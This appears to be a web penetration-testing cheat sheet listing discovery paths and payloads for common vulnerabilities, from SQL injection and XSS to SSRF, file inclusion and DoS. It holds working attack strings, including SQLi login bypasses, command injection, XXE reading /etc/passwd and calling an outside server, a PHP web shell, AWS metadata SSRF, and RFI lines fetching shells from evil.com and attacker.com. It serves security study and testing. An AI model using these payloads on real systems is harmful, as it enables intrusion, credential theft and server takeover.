# 1. Injection Attacks 💉

## 1.1 SQL Injection(SQLi) :

Inject malicious SQL queries to access, modify, or delete database data.  
**Discovery Path** :

- URL Parameters (?id=1)
- Form Fields (login,search,contact forms)
- HTTP Header (User-Agent, Referer)

**Common payload** :

- basic ( `?id=1' --` , `?id=1' AND '1'='1` )
- Error based ( `?id=1"` , `?id=1 AND 1=CONVERT(int, (SELECT @@version))` )
- Time based in MySql ( `?id=1' AND SLEEP(5) --` )
- Time based in MsSql ( `?id=1'; WAITFOR DELAY '0:0:5' --` )
- sqlmap command ( `sqlmap -u "http://example.com/page.php?id=1" --batch --dbs` )
- Bypass Authentication ( `' OR '1'='1` , `' OR 1=1--` )

## 1.2 Command Injection :

Execute arbitrary system-level commands on the server. Look for input fields or URLs that interact with system-level commands.  
**Discovery Path** :

- Search Box
- Ping/Traceroute utilities
- File upload/rename/delete functions
- URL Parameters like: ( ?host=, ?ip=, ?cmd=, ?target= )

**Common payload** :

- linux ( `127.0.0.1; whoami` )
- window ( `127.0.0.1 && whoami` )
- linux delay ( `127.0.0.1; sleep 5` )
- windows delay ( `127.0.0.1 & ping -n 6 127.0.0.1` )
- Commix command ( `commix --url="http://example.com/page?host=127.0.0.1" --level=2` )

## 1.3 LDAP Injection :

Manipulate LDAP queries to bypass authentication or access data.  
**Discovery Path** :

- Search fields (e.g., employee name, email, department)
- Login or lookup functions
- URLParameters like: ( username=, filter=, search= )

**Common Payload** :

- Always true ( `admin*)(&)` )
- Add new one ( `*)(uid=*)` )
- And Or Condition ( `admin)(|(uid=*))` )

## 1.4 XML External Entity (XXE) :

Exploit XML parsers to disclose internal files or SSRF attacks.  
**Discovery Path**:

- Capture a POST request with XML data.
- Add the XXE payload in the body.
- Forward and monitor the response or OOB DNS logs.

**Common Payload**:

- In-Bind attack <pre> `xml <?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <user> <name>&xxe;</name> </user> ` </pre>
- Out-of-Bind Attack <pre> `<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://your-server.com/xxe.txt" >]> <user> <name>&xxe;</name> </user> ` </pre>

---

# 2. Authentication and Authorization Issues 🔐

## 2.1 Broken Authentication :

Exploit weak or flawed authentication mechanisms to gain unauthorized access.  
**Discovery Path**:

- Login endpoints with username and password
- Password reset or forgot password forms
- Session management (tokens, cookies)

**Common Payloads / Techniques**:

- Brute-force login using wordlists (`admin:admin`, `user:123456`)
- Bypass logic flaws (e.g., send only username, empty password)
- Replay expired or predictable session tokens
- Use default credentials (admin/admin)

## 2.2 Broken Access Control :

Access resources or perform actions that should be restricted.  
**Discovery Path**:

- Endpoints that return user-specific data (`/user?id=123`)
- Admin-only or role-specific panels (`/admin`, `/config`)
- Hidden UI elements (inspect via browser DevTools)

**Common Payloads / Techniques**:

- IDOR test: change `user_id=1` to `user_id=2` in URLs or POST data
- Manually access `/admin`, `/manage/users` without proper role
- Remove or modify `isAdmin=false` in requests
- Use Burp’s “Parameter Pollution” to escalate permissions

## 2.3 Account Takeover (ATO) :

Gain control of another user's account via insecure flows.  
**Discovery Path**:

- Weak or predictable password reset tokens
- Email or phone change features
- Insecure OAuth or 2FA implementations

**Common Payloads / Techniques**:

- Capture and reuse password reset link from intercepted email
- Bruteforce or guess token values (`/reset?token=1234`)
- Change email to attacker’s without re-authentication
- Session fixation: login a victim to attacker’s session

---

# 3. Cross-Site Scripting (XSS) 🛠️

## 3.1 Reflected XSS :

Malicious script is reflected in the response and executed immediately.  
**Discovery Path**:

- URL parameters (`?q=`, `?search=`)
- GET or POST form inputs
- Error messages or status alerts

**Common Payloads**:

- `<script>alert(1)</script>`
- `<img src=x onerror=alert(1)>`
- `<svg/onload=alert(1)>`
- `"><script>alert(document.domain)</script>`
- `<iframe src="javascript:alert(1)">`

## 3.2 Stored XSS :

Malicious input is permanently stored on the server and executed when viewed.  
**Discovery Path**:

- Comment sections
- Profile bio / About Me
- Chat systems, forums, admin dashboards

**Common Payloads**:

- `<script>alert('StoredXSS')</script>`
- `<img src=x onerror=confirm('XSS')>`
- `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`

## 3.3 DOM-Based XSS :

Client-side JavaScript dynamically injects or executes unsanitized input.  
**Discovery Path**:

- Look for JS handling of `location.hash`, `document.URL`, `location.search`
- Interact with URL fragments (`#name=evil`) or parameters

**Common Payloads**:

- `#<img src=x onerror=alert(1)>`
- `?input=<svg/onload=alert(1)>`
- `<a href="/page#"><script>alert(1)</script></a>`

---

# 4. Information Disclosure 📚

## 4.1 Sensitive Data Exposure :

Improper handling of sensitive information such as credentials, tokens, or PII.  
**Discovery Path**:

- API responses revealing sensitive info
- Tokens stored in `localStorage` / `sessionStorage`
- Exposed `.env`, `.bak`, `.git`, or config files
- HTTP (insecure) instead of HTTPS

**Common Findings**:

- Hardcoded API keys or secrets in frontend JS
- JWTs without `exp` (expiry) or weak signing
- Plaintext passwords in responses or logs
- Base64 encoded sensitive data (check and decode)

## 4.2 Server Error Messages :

Verbose error responses leak backend internals.  
**Discovery Path**:

- Trigger input validation or type conversion errors
- Use special characters like `'`, `"`, `<`, `{{}}`, `}}`, `[]`

**Common Payloads / Examples**:

- `'` → SQL error trace (e.g., `You have an error in your SQL syntax`)
- `<%` or `{{` → Template injection errors (e.g., Mustache, Handlebars)
- Full stack trace showing file paths, version numbers, or DB queries

## 4.3 Source Code Disclosure :

Accidental exposure of source code or sensitive project files.  
**Discovery Path**:

- Access backup or temp files (`index.php~`, `config.bak`)
- Access open directories or version control folders
- Fuzz file extensions using wordlists or tools like `feroxbuster`, `dirsearch`

**Common Payloads / Paths**:

- `/.git/config`
- `/backup.zip`, `/db.sql`
- `/config.old`, `/admin.bak`
- `/.env` (contains credentials)

---

# 5. File Upload Vulnerabilities 📤

## 5.1 Unrestricted File Upload :

Improper file validation allows attackers to upload malicious files (e.g., shells, scripts).  
**Discovery Path**:

- Profile picture uploads
- Document upload features (resume, PDF, etc.)
- Support ticket systems with attachments
- Web-based file managers

**Common Payloads**:

- PHP Web Shell: `<?php system($_GET['cmd']); ?>` saved as `shell.php`
- Double extension: `shell.php.jpg`, `exploit.jpg.php`
- Rename file via Burp and remove validation: `shell.php` ➝ Content-Type: `image/jpeg`

**Test**:

- Upload file and access via `https://target.com/uploads/shell.php`
- If blocked, try changing headers or file extension

## 5.2 Content-Type Bypass :

Bypass MIME-type or content-type filters used to restrict dangerous file types.  
**Discovery Path**:

- Intercept file upload in Burp
- Change `Content-Type`, `filename`, and `extension`
- Test with multiple upload points

**Common Payloads**:

- Change `Content-Type: image/png` while sending PHP script
- Filename tricks: `file.php.jpg`, `file.ph%00p`, `file.PHP`
- Upload .htaccess to allow execution:

---

# 6. Security Misconfigurations 👨‍🔧

## 6.1 Default Credentials :

Use of manufacturer-set or publicly known default usernames and passwords.  
**Discovery Path**:

- Attempt login with known default credentials (e.g., `admin:admin`, `root:toor`)
- Search for device or software default creds in databases like [https://www.cirt.net/passwords](https://www.cirt.net/passwords)
- Inspect configuration files, code comments, or documentation for hardcoded creds
- Review HTTP responses or error messages for credential hints

**Common Payloads / Attempts**:

- `admin:admin`
- `root:root`
- `guest:guest`
- `admin:password`
- `ftp:ftp`
- `test:test`
- Bruteforce with `hydra`, `ncrack`, or `medusa` using default creds lists

## 6.2 Directory Listing Enabled :

Web server is misconfigured to allow listing of directory contents, exposing sensitive files.  
**Discovery Path**:

- Manually browse to common folders (e.g., `/uploads/`, `/images/`, `/admin/`)
- Use tools like `dirsearch`, `feroxbuster`, or `gobuster` to find exposed directories
- Look for index pages displaying file listings (`Index of /`)

**Common Payloads / Paths**:

- `/uploads/`
- `/backup/`
- `/logs/`
- `/admin/`
- `/images/`
- `/files/`
- `/~user/` (home directories)

## 6.3 Open Admin Panels :

Unprotected or publicly accessible administrative interfaces that may allow unauthorized access.  
**Discovery Path**:

- Scan for common admin panel paths using tools like `dirsearch`, `feroxbuster`, or `gobuster`
- Use search engines (e.g., Google Dork: `intitle:"admin panel"` or `inurl:admin`)
- Analyze JavaScript files or HTTP responses for hidden or referenced admin routes
- Check for weak or no authentication on admin endpoints

**Common Payloads / Paths**:

- `/admin/`
- `/administrator/`
- `/wp-admin/`
- `/cms/`
- `/login/`
- `/controlpanel/`
- `/cpanel/`
- `/phpmyadmin/`

---

# 7. Vulnerable Components 📦

## 7.1 Outdated Libraries/Plugins :

Use of outdated or vulnerable third-party libraries, plugins, or frameworks that may expose known exploits.  
**Discovery Path**:

- Analyze `package.json`, `composer.json`, `requirements.txt`, etc. for version info
- Inspect HTTP response headers or comments revealing library versions
- Use scanners like `npm audit`, `retire.js`, `OWASP Dependency-Check`, or `safety`
- Check JavaScript files in `/assets/`, `/static/`, or `/vendor/` directories
- Monitor public CVE databases for known vulnerabilities in detected versions

**Common Payloads / Checks**:

- Detect jQuery versions (e.g., `jquery-1.7.1.min.js`)
- Look for old CMS plugins/themes (e.g., WordPress, Joomla)
- Check versions in files like:
  - `/assets/js/libs/jquery.js`
  - `/vendor/package/version.txt`
  - `/static/js/bootstrap.min.js`
- Compare found versions with [https://cve.mitre.org](https://cve.mitre.org) or [https://snyk.io/vuln](https://snyk.io/vuln)

## 7.2 CVE Exploitation :

Targeting known vulnerabilities (CVEs) in software, services, or components that are publicly disclosed and often weaponized.  
**Discovery Path**:

- Identify software and version via banners, headers, error messages, or exposed files
- Use tools like `nmap`, `whatweb`, `httprint`, or `Wappalyzer` to fingerprint technologies
- Search for known CVEs on [https://cve.mitre.org](https://cve.mitre.org), [https://nvd.nist.gov](https://nvd.nist.gov), or [https://exploit-db.com](https://exploit-db.com)
- Correlate version info with publicly available exploits on GitHub or Exploit-DB

**Common Payloads / Exploit Sources**:

- CVE-specific PoCs (e.g., `CVE-2021-41773` Apache path traversal)
- Metasploit modules: `search cve:<year>-<id>`
- GitHub repositories containing public exploit code
- Exploit-DB scripts: `searchsploit <software_name> <version>`
- Shodan or Censys for identifying exposed vulnerable services

---

# 8. Business Logic Vulnerabilities 📈

## 8.1 Logic Flaws :

Flaws in the application’s logic or workflow that can be abused to bypass security controls or perform unintended actions.  
**Discovery Path**:

- Analyze the application's business logic, workflows, and input handling
- Test for unexpected behaviors (e.g., skipping steps, reordering requests)
- Manipulate parameters or sequence of actions to bypass restrictions
- Observe differences in server responses when altering logical conditions

**Common Payloads / Techniques**:

- Bypassing payment or authorization steps by modifying request sequence
- Changing `user_id`, `order_id`, or `role` in requests
- Skipping client-side checks and submitting direct POST requests
- Testing multi-step workflows with missing or repeated steps
- Abuse of discount logic, rate limits, or reward systems

## 8.2 Price Manipulation :

Tampering with product prices or transaction values to pay less or gain undue advantage.  
**Discovery Path**:

- Intercept and modify requests using proxies like `Burp Suite` or `OWASP ZAP`
- Inspect client-side code (JavaScript, hidden form fields) for price data
- Test altering price parameters in HTTP requests (e.g., `price=100` to `price=1`)
- Analyze API endpoints for price validation weaknesses
- Check for missing server-side verification of prices or discounts

**Common Payloads / Techniques**:

- Changing `price`, `total`, `discount`, or `amount` fields in requests
- Modifying JSON payloads or form data with tampered values
- Exploiting lack of price integrity checks in cookies or local storage
- Replaying old transaction requests with manipulated prices
- Bypassing client-side validation by sending crafted server requests

## 8.3 Coupon Abuse :

Exploitation of discount or promotional coupon systems to gain unintended discounts or free products.  
**Discovery Path**:

- Test coupon code application beyond intended usage limits (e.g., multiple uses, stacking)
- Attempt reuse of single-use coupons or expired coupons
- Analyze coupon generation logic in client-side code or API endpoints
- Inspect coupon validation and redemption workflows for weaknesses
- Use tools like `Burp Suite` to intercept and modify coupon-related requests

**Common Payloads / Techniques**:

- Reusing single-use or limited-use coupon codes multiple times
- Combining multiple coupons where only one should be allowed
- Using invalid, expired, or manipulated coupon codes
- Altering coupon values or expiration dates in requests
- Exploiting predictable coupon code generation patterns

---

# 9. Cross-Site Request Forgery (CSRF) 🌐

## 9.1 CSRF on Critical Actions :

Cross-Site Request Forgery (CSRF) attacks trick authenticated users into performing unintended actions on a web application.  
**Discovery Path**:

- Identify critical actions that modify data or perform sensitive operations (e.g., password changes, fund transfers)
- Check if these actions are protected by CSRF tokens or other anti-CSRF mechanisms
- Use proxy tools like `Burp Suite` to capture and replay requests without CSRF tokens
- Analyze forms and HTTP headers for presence/absence of CSRF tokens

**Common Payloads / Techniques**:

- Crafting malicious HTML forms or scripts that trigger requests on behalf of the victim
- Exploiting lack of or predictable CSRF tokens
- Submitting forged POST or GET requests that perform state-changing operations
- Leveraging HTTP methods like POST, PUT, DELETE without CSRF protections
- Exploiting vulnerable AJAX endpoints lacking CSRF validation

---

# 10. Server-Side Request Forgery (SSRF) 🌍

## 10.1 SSRF to Internal Systems :

Server-Side Request Forgery (SSRF) allows attackers to make requests from the vulnerable server to internal or external systems, potentially bypassing firewall restrictions.  
**Discovery Path**:

- Identify input fields or parameters that trigger server-side HTTP requests (e.g., URL fetchers, image loaders, webhooks)
- Test with payloads targeting internal IP ranges (`127.0.0.1`, `10.0.0.0/8`, `192.168.0.0/16`, `169.254.169.254`)
- Use tools like `Burp Suite` or `SSRFmap` to automate SSRF detection and exploitation
- Observe server responses and behavior when requesting internal services (databases, metadata APIs)

**Common Payloads / Techniques**:

- `http://127.0.0.1/`
- `http://localhost/`
- `http://169.254.169.254/latest/meta-data/` (AWS EC2 metadata)
- `file:///etc/passwd` (local file inclusion via SSRF)
- Using different protocols (e.g., `gopher://`, `dict://`) to bypass filters
- DNS rebinding or callback techniques to detect SSRF

---

# 11. Token-Related Vulnerabilities 🔑

## 11.1 Insecure JWT Handling :

Improper implementation or validation of JSON Web Tokens (JWT) that can lead to unauthorized access or token forgery.  
**Discovery Path**:

- Analyze JWT structure and contents (header, payload, signature) using tools like `jwt.io` or `jwt-cli`
- Check for weak signing algorithms (e.g., `alg: none`, `HS256` with known secret)
- Attempt token tampering by modifying payload and resigning with known or no secret
- Inspect token expiration, audience (`aud`), issuer (`iss`), and other claims for proper validation
- Test token replay or use of expired tokens in requests

**Common Payloads / Techniques**:

- Using `alg: none` to bypass signature verification
- Brute forcing or guessing JWT signing secret keys
- Modifying token payload to escalate privileges or change user identity
- Reusing expired or revoked tokens due to missing validation
- Exploiting weak or hardcoded secrets in code repositories

## 11.2 Token Reuse or Prediction :

Reuse or predictable generation of tokens that allow attackers to impersonate users or gain unauthorized access.  
**Discovery Path**:

- Analyze token generation patterns for predictability or weak randomness
- Capture tokens in transit using proxy tools like `Burp Suite` or `OWASP ZAP`
- Test reuse of old or expired tokens to check for validation lapses
- Inspect API responses or logs for leaked or repeated tokens
- Attempt brute force or enumeration attacks on token values

**Common Payloads / Techniques**:

- Reusing session, API, or authentication tokens across multiple requests or sessions
- Predicting token values based on timestamps, user IDs, or sequential patterns
- Exploiting missing token invalidation on logout or password changes
- Using stolen tokens from logs, caches, or insecure storage
- Leveraging weak random number generators in token creation

---

# 12. Client-Side Attacks 📡

## 12.1 Clickjacking :

An attack where a malicious site tricks users into clicking on hidden or disguised UI elements, causing unintended actions.  
**Discovery Path**:

- Check if the web application allows embedding in frames or iframes
- Use browser developer tools or online scanners to test framing
- Inspect HTTP response headers for `X-Frame-Options` or `Content-Security-Policy` frame directives
- Attempt to overlay transparent layers or buttons over legitimate UI elements

**Common Payloads / Techniques**:

- Embedding the target site inside an invisible iframe on an attacker-controlled page
- Using `frame` or `iframe` HTML tags to load vulnerable pages
- Exploiting lack of `X-Frame-Options: DENY` or `SAMEORIGIN` headers
- Leveraging `Content-Security-Policy: frame-ancestors` misconfigurations
- Combining with social engineering to trick user clicks

## 12.2 CORS Misconfigurations :

Improper Cross-Origin Resource Sharing (CORS) settings that allow unauthorized domains to access restricted resources.  
**Discovery Path**:

- Analyze `Access-Control-Allow-Origin` header values in HTTP responses
- Test CORS behavior by sending requests with different `Origin` headers using tools like `curl` or `Burp Suite`
- Look for wildcard (`*`) or overly permissive origins in CORS headers
- Check for presence and correctness of other CORS headers (`Access-Control-Allow-Credentials`, `Access-Control-Allow-Methods`)
- Use automated scanners like `Corsy` or `Nuclei` with CORS templates

**Common Payloads / Techniques**:

- Exploiting `Access-Control-Allow-Origin: *` combined with `Access-Control-Allow-Credentials: true`
- Bypassing CORS by manipulating `Origin` header values
- Utilizing malicious websites to perform unauthorized AJAX requests
- Leveraging CORS to steal sensitive data via cross-origin requests
- Targeting misconfigured endpoints that trust unvalidated origins

---

# 13. Local and Remote File Inclusion 📁

## 13.1 Local File Inclusion (LFI) :

A vulnerability that allows attackers to include files from the local server, potentially exposing sensitive information or enabling code execution.  
**Discovery Path**:

- Identify parameters that include files (e.g., `?page=`, `?file=`)
- Test with traversal payloads like `../../../../etc/passwd` to access sensitive files
- Use tools like `Burp Suite`, `ffuf`, or `wfuzz` to automate LFI discovery
- Check error messages revealing file paths or server structure
- Attempt null byte injection or wrapper protocols (e.g., `php://`, `expect://`)

**Common Payloads / Techniques**:

- `../../../../etc/passwd`
- `../../../../var/log/apache2/access.log`
- `php://filter/convert.base64-encode/resource=index.php`
- `expect://id`
- Null byte (`%00`) injections to bypass filters
- Combining LFI with log poisoning for code execution

## 13.2 Remote File Inclusion (RFI) :

A vulnerability allowing attackers to include and execute remote files on the server, often leading to remote code execution.  
**Discovery Path**:

- Identify parameters that include files (e.g., `?page=`, `?file=`) which accept remote URLs
- Test inclusion of external URLs like `http://attacker.com/shell.txt`
- Use tools such as `Burp Suite` or `ffuf` to fuzz and detect RFI points
- Look for error messages or behavior indicating remote resource loading
- Check if `allow_url_include` and `allow_url_fopen` PHP settings are enabled (if applicable)

**Common Payloads / Techniques**:

- `http://evil.com/shell.txt`
- `https://attacker.com/malicious.php`
- Using public code hosting URLs (e.g., GitHub raw files) as payload source
- Exploiting insecure file upload or download mechanisms
- Combining RFI with web shells for full server control

---

# 14. Rate Limiting & DoS ⏱️

## 14.1 Lack of Rate Limiting :

Absence of controls to limit the number of requests a user or IP can make in a given time, allowing brute force or denial-of-service attacks.  
**Discovery Path**:

- Test repeated requests to login, password reset, or API endpoints rapidly
- Use automated tools like `Burp Intruder`, `Hydra`, or `WFuzz` to send bursts of requests
- Observe if account lockout, CAPTCHA, or throttling mechanisms activate
- Monitor server response times and status codes during rapid requests
- Check logs or application behavior for rate limit enforcement

**Common Payloads / Techniques**:

- Brute forcing credentials by sending thousands of login attempts
- Performing password spraying attacks over multiple accounts
- Flooding API endpoints to exhaust resources or cause service degradation
- Testing absence of lockouts on failed attempts
- Exploiting unlimited password reset or OTP request flows

## 14.2 Resource Exhaustion :

Overloading a system by consuming excessive CPU, memory, disk space, or network bandwidth, leading to degraded performance or denial of service.  
**Discovery Path**:

- Send large or complex payloads to application endpoints to observe resource usage
- Test for memory leaks or CPU spikes under high load using stress testing tools
- Use fuzzers or automated scripts to bombard the server with requests or data
- Monitor server metrics (CPU, RAM, disk I/O, network) during testing
- Identify endpoints lacking input validation or rate limiting

**Common Payloads / Techniques**:

- Large file uploads or repeated upload attempts
- Recursive or deeply nested inputs causing excessive processing
- Slowloris-style slow HTTP requests
- Flooding with simultaneous connections or requests
- Exploiting poorly optimized database queries or code loops
